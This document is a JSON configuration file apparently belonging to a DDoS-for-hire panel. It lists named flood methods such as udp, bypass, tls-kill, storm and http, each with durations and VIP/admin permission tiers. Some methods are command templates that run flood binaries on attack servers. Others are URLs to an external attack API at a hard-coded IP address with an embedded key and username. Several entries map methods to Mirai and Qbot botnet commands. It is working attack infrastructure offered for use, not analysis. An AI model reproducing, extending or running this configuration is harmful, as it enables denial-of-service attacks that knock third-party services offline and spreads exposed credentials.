[
	{
		"name":"udp",
		"time":120,
		"description":"Not Available",
		"group":"test",
		"default port":80,
		"default time":100,
		"permission":[],
		"api":[
			"http://placeholder.co/api?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=realmethodname"
		],
		"server":[
			{
				"name":"omega",
				"command":"./udp <<$host>> <<$port>> <<$time>>"
			},
			{
				"name":"alpha",
				"command":"wall <<$host>> <<$port>> <<$time>>"
			}
		],
		"botnet":{
			"qbot":"udp",
			"mirai":"udp"
		}
	},
 	{
		"name":"death",
		"time":999999,
		"description":"Penetrate Defenses, Defy Captchas",
		"permission":["vip"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=DEATH",
			"http://link.two",
			"http://link.three"
		]
	},
 	{
		"name":"bypass",
		"time":999999,
		"description":"Penetrate Defenses, Kill Target",
		"permission":["vip"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BYPASS",
			"http://link.two",
			"http://link.three"
		]
	},
 	{
		"name":"bypassv2",
		"time":999999,
		"description":"Penetrate Defenses, More Powerful",
		"permission":["vip"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BYPASSV2",
			"http://link.two",
			"http://link.three"
		]
	},
 	{
		"name":"tls",
		"time":999999,
		"description":"Encrypted Chaos, Unstoppable Disruption",
		"permission":["vip"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS",
			"http://link.two",
			"http://link.three"
		]
	},
	{
		"name":"tls-kill",
		"time":999999,
		"description":"Terminate Security, Cripple The Core",
		"permission":["vip"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS-KILL",
			"http://link.two",
			"http://link.three"
		]
	},
	{
		"name":"storm",
		"time":999999,
		"description":"Overwhelm The System, Command The Chaos",
		"permission":["vip","admin"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=STORM"
		]
	},
 	{
		"name":"power",
		"time":999999,
		"description":"Maximum Force, Total Overload",
		"permission":["vip","admin"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=STRIKE"
		]
	},
 	{
		"name":"glory",
		"time":999999,
		"description":"Overpower With Precision, Strike With Impact",
		"permission":["vip","admin"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GLORY"
		]
	},
 	{
		"name":"mix",
		"time":999999,
		"description":"Diversity The Attack, Break The Defense",
		"permission":["vip","admin"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIX"
		]
	},
 	{
		"name":"http",
		"time":120,
		"description":"Silent Request, Loud Disruptions [ERROR]",
		"permission":["vip","admin"],
		"api":[
			"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTP"
		]
	},
	{
		"name":"tcp",
		"time":2111,
		"description":"Not Available",
		"permission":[],
        "botnet":{
            "mirai":"udp"
        }

	}
]
